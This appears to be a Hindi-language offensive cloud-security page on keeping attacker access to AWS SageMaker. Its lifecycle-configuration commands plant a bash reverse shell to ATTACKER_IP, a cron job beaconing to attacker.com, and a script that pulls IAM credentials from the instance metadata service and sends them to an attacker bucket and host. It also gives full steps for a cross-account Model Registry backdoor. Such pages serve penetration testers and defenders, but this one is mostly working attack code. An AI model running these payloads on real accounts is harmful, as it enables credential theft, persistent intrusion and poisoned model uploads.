# AWS - SageMaker Persistence

{{#include ../../../../banners/hacktricks-training.md}}

## Persistence Techniques का अवलोकन

यह अनुभाग SageMaker में Persistence प्राप्त करने के तरीकों को बताता है, जिनमें Lifecycle Configurations (LCCs) का दुरुपयोग करके reverse shells, cron jobs, credential theft via IMDS, और SSH backdoors शामिल हैं। ये scripts instance के IAM role के साथ चलते हैं और restarts के बाद भी persist रह सकते हैं। अधिकांश techniques को outbound network access की आवश्यकता होती है, लेकिन AWS control plane की सेवाओं का उपयोग तब भी सफल हो सकता है यदि environment 'VPC-only" mode में हो।

> [!TIP]
> नोट: SageMaker notebook instances मूलतः managed EC2 instances हैं जो विशेष रूप से machine learning workloads के लिए कॉन्फ़िगर किए गए हैं।

## आवश्यक अनुमतियाँ
* Notebook Instances:
```
sagemaker:CreateNotebookInstanceLifecycleConfig
sagemaker:UpdateNotebookInstanceLifecycleConfig
sagemaker:CreateNotebookInstance
sagemaker:UpdateNotebookInstance
```
* Studio Applications:
```
sagemaker:CreateStudioLifecycleConfig
sagemaker:UpdateStudioLifecycleConfig
sagemaker:UpdateUserProfile
sagemaker:UpdateSpace
sagemaker:UpdateDomain
```
## नोटबुक इंस्टेंस पर लाइफसाइकल कॉन्फ़िगरेशन सेट करें

### उदाहरण AWS CLI कमांड:
```bash
# Create Lifecycle Configuration*

aws sagemaker create-notebook-instance-lifecycle-config \
--notebook-instance-lifecycle-config-name attacker-lcc \
--on-start Content=$(base64 -w0 reverse_shell.sh)


# Attach Lifecycle Configuration to Notebook Instance*

aws sagemaker update-notebook-instance \
--notebook-instance-name victim-instance \
--lifecycle-config-name attacker-lcc
```
## SageMaker Studio पर Lifecycle Configuration सेट करें

Lifecycle Configurations को SageMaker Studio के भीतर विभिन्न स्तरों और अलग-अलग ऐप प्रकारों पर जोड़ा जा सकता है।

### Studio Domain स्तर (सभी उपयोगकर्ता)
```bash
# Create Studio Lifecycle Configuration*

aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-studio-lcc \
--studio-lifecycle-config-app-type JupyterServer \
--studio-lifecycle-config-content $(base64 -w0 reverse_shell.sh)


# Apply LCC to entire Studio Domain*

aws sagemaker update-domain --domain-id <DOMAIN_ID> --default-user-settings '{
"JupyterServerAppSettings": {
"DefaultResourceSpec": {"LifecycleConfigArn": "<LCC_ARN>"}
}
}'
```
### Studio Space स्तर (Individual or Shared Spaces)
```bash
# Update SageMaker Studio Space to attach LCC*

aws sagemaker update-space --domain-id <DOMAIN_ID> --space-name <SPACE_NAME> --space-settings '{
"JupyterServerAppSettings": {
"DefaultResourceSpec": {"LifecycleConfigArn": "<LCC_ARN>"}
}
}'
```
## Studio एप्लिकेशन लाइफसाइकल कॉन्फ़िगरेशन के प्रकार

लाइफसाइकल कॉन्फ़िगरेशन को विशेष रूप से विभिन्न SageMaker Studio एप्लिकेशन प्रकारों पर लागू किया जा सकता है:
* JupyterServer: Jupyter server startup के दौरान स्क्रिप्ट्स चलाता है, जो persistence mechanisms जैसे reverse shells और cron jobs के लिए आदर्श है।
* KernelGateway: KernelGateway ऐप लॉन्च के दौरान निष्पादित होता है, प्रारंभिक सेटअप या स्थायी पहुँच के लिए उपयोगी है।
* CodeEditor: Code Editor (Code-OSS) पर लागू होता है, यह उन स्क्रिप्ट्स को सक्षम बनाता है जो code editing sessions की शुरुआत पर चलती हैं।

### प्रत्येक प्रकार के लिए उदाहरण कमांड:

### JupyterServer
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-jupyter-lcc \
--studio-lifecycle-config-app-type JupyterServer \
--studio-lifecycle-config-content $(base64 -w0 reverse_shell.sh)
```
### KernelGateway
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-kernelgateway-lcc \
--studio-lifecycle-config-app-type KernelGateway \
--studio-lifecycle-config-content $(base64 -w0 kernel_persist.sh)
```
### CodeEditor
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-codeeditor-lcc \
--studio-lifecycle-config-app-type CodeEditor \
--studio-lifecycle-config-content $(base64 -w0 editor_persist.sh)
```
### महत्वपूर्ण जानकारी:
* डोमेन या स्पेस स्तर पर LCCs संलग्न करने से स्कोप के भीतर सभी उपयोगकर्ता या एप्लिकेशन प्रभावित होते हैं।
* इसके लिए उच्च अनुमतियाँ (sagemaker:UpdateDomain, sagemaker:UpdateSpace) आवश्यक होती हैं; आमतौर पर स्पेस स्तर पर यह डोमेन की तुलना में अधिक व्यवहार्य होता है।
* नेटवर्क-स्तरीय नियंत्रण (उदा., strict egress filtering) सफल reverse shells या data exfiltration को रोक सकते हैं।

## Lifecycle Configuration के माध्यम से Reverse Shell

SageMaker Lifecycle Configurations (LCCs) तब कस्टम स्क्रिप्ट चलाती हैं जब notebook instances शुरू होते हैं। किसी अटैकर के पास उपयुक्त अनुमतियाँ होने पर वह एक स्थायी reverse shell स्थापित कर सकता है।

### Payload Example:
```
#!/bin/bash
ATTACKER_IP="<ATTACKER_IP>"
ATTACKER_PORT="<ATTACKER_PORT>"
nohup bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 &
```
## Cron Job Persistence के माध्यम से Lifecycle Configuration

एक हमलावर LCC scripts के माध्यम से cron jobs इंजेक्ट कर सकता है, जिससे malicious scripts या commands का नियतकालिक निष्पादन सुनिश्चित होता है और stealthy persistence संभव हो जाता है।

### Payload उदाहरण:
```
#!/bin/bash
PAYLOAD_PATH="/home/ec2-user/SageMaker/.local_tasks/persist.py"
CRON_CMD="/usr/bin/python3 $PAYLOAD_PATH"
CRON_JOB="*/30 * * * * $CRON_CMD"

mkdir -p /home/ec2-user/SageMaker/.local_tasks
echo 'import os; os.system("curl -X POST http://attacker.com/beacon")' > $PAYLOAD_PATH
chmod +x $PAYLOAD_PATH

(crontab -u ec2-user -l 2>/dev/null | grep -Fq "$CRON_CMD") || (crontab -u ec2-user -l 2>/dev/null; echo "$CRON_JOB") | crontab -u ec2-user -
```
## Credential Exfiltration के माध्यम से IMDS (v1 & v2)

Lifecycle configurations Instance Metadata Service (IMDS) को क्वेरी करके IAM credentials प्राप्त कर सकते हैं और उन्हें हमलावर द्वारा नियंत्रित स्थान पर exfiltrate कर सकते हैं।

### Payload उदाहरण:
```bash
#!/bin/bash
ATTACKER_BUCKET="s3://attacker-controlled-bucket"
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME > /tmp/creds.json

# Exfiltrate via S3*

aws s3 cp /tmp/creds.json $ATTACKER_BUCKET/$(hostname)-creds.json

# Alternatively, exfiltrate via HTTP POST*

curl -X POST -F "file=@/tmp/creds.json" http://attacker.com/upload
```
## Persistence via Model Registry resource policy (PutModelPackageGroupPolicy)

एक SageMaker Model Package Group पर resource-based policy का दुरुपयोग करके किसी external principal को cross-account अधिकार दिए जा सकते हैं (उदा., CreateModelPackage/Describe/List)। यह एक टिकाऊ backdoor बनाता है जो attacker के IAM user/role को victim account से हटा दिया जाने पर भी poisoned model versions push करने या model metadata/artifacts पढ़ने की अनुमति देता है।

आवश्यक अनुमतियाँ
- sagemaker:CreateModelPackageGroup
- sagemaker:PutModelPackageGroupPolicy
- sagemaker:GetModelPackageGroupPolicy

कदम (us-east-1)
```bash
# 1) Create a Model Package Group
REGION=${REGION:-us-east-1}
MPG=atk-mpg-$(date +%s)
aws sagemaker create-model-package-group \
--region "$REGION" \
--model-package-group-name "$MPG" \
--model-package-group-description "Test backdoor"

# 2) Craft a cross-account resource policy (replace 111122223333 with attacker account)
cat > /tmp/mpg-policy.json <<JSON
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "AllowCrossAccountCreateDescribeList",
"Effect": "Allow",
"Principal": {"AWS": ["arn:aws:iam::111122223333:root"]},
"Action": [
"sagemaker:CreateModelPackage",
"sagemaker:DescribeModelPackage",
"sagemaker:DescribeModelPackageGroup",
"sagemaker:ListModelPackages"
],
"Resource": [
"arn:aws:sagemaker:${REGION}:<VICTIM_ACCOUNT_ID>:model-package-group/${MPG}",
"arn:aws:sagemaker:${REGION}:<VICTIM_ACCOUNT_ID>:model-package/${MPG}/*"
]
}
]
}
JSON

# 3) Attach the policy to the group
aws sagemaker put-model-package-group-policy \
--region "$REGION" \
--model-package-group-name "$MPG" \
--resource-policy "$(jq -c . /tmp/mpg-policy.json)"

# 4) Retrieve the policy (evidence)
aws sagemaker get-model-package-group-policy \
--region "$REGION" \
--model-package-group-name "$MPG" \
--query ResourcePolicy --output text
```
Notes
- एक वास्तविक cross-account backdoor के लिए, Resource को specific group ARN तक सीमित करें और Principal में attacker’s AWS account ID का उपयोग करें।
- end-to-end cross-account deployment या artifact reads के लिए, S3/ECR/KMS grants को attacker account के साथ align करें।

Impact
- Model Registry group का persistent cross-account नियंत्रण: attacker malicious model versions publish कर सकता है या model metadata को enumerate/read कर सकता है, भले ही उनकी IAM entities victim account से हटाई जा चुकी हों।

## Canvas cross-account model registry backdoor (UpdateUserProfile.ModelRegisterSettings)

SageMaker Canvas user settings का दुरुपयोग करके model registry writes को चुपचाप attacker-controlled account पर redirect करें, ModelRegisterSettings को enable करके और CrossAccountModelRegisterRoleArn को किसी अन्य account के attacker role की ओर point करके।

Required permissions
- sagemaker:UpdateUserProfile target UserProfile पर
- ऐच्छिक: sagemaker:CreateUserProfile उस Domain पर जिसे आप नियंत्रित करते हैं

{{#include ../../../../banners/hacktricks-training.md}}
